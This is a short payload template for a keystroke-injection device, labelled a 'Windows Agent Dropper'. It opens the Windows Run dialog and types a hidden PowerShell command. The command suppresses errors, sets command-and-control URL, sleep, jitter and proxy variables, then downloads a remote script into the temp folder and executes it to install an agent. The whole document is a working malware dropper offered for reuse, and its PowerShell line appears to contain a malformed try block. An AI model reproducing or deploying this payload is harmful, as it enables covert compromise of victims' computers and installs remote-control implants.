name: Windows Agent Dropper (Signed PS Template)
description: Runs a signed PowerShell installer script with AllSigned policy. Requires you host a code-signed PS1 that downloads/installs the agent. Set: SIGNED_PS_URL, C2_URL, JITTER, SLEEP, PROXY
script:
REM Windows Agent Dropper using signed PowerShell script
GUI r
DELAY 400
STRING powershell -w hidden -ExecutionPolicy AllSigned -c "$ErrorActionPreference='SilentlyContinue';$env:DB_C2='${C2_URL}';$env:DB_SLEEP='${SLEEP:=60}';$env:DB_JITTER='${JITTER:=30}';if('${PROXY}' -ne ''){$env:DB_PROXY='${PROXY}'};$u='${SIGNED_PS_URL}';$ps=$env:TEMP+'\db-installer.ps1';try{iwr $u -UseBasicParsing -OutFile $ps;}& $ps"
ENTER
